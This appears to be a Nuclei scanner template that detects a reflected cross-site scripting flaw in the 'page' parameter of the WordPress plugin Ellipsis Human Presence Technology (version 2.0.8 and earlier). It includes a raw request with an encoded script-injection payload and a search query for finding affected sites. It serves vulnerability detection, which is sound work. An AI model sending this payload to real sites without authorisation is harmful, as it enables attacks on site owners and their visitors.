http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.location)</script>
    - <form id="protected-forms-table"
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  raw:
  - 'GET /wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?&page=%22%20%3E%3Cscript%3Ealert(document.location)%3C/script%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: wp-ellipsis-xss
info:
  author: r3Y3r53
  description: 'The ''page'' GET parameter of the inc/protected-forms-table.php file
    was affected by a reflected XSS vulnerability.

    '
  metadata:
    max-request: 1
    publicwww-query: /wp-content/plugins/ellipsis-human-presence-technology/
    verified: true
  name: Ellipsis Human Presence Technology <= 2.0.8 - Cross Site Scripting
  reference:
  - https://wpscan.com/vulnerability/c0a138d8-93ac-463c-b650-d849352c0b44
  - https://packetstormsecurity.com/files/154393/
  - https://wordpress.org/plugins/ellipsis-human-presence-technology/
  severity: medium
  tags: wpscan,packetstorm,wordpress,wp-plugin,ellipsis-human-presence-technology,xss,vuln
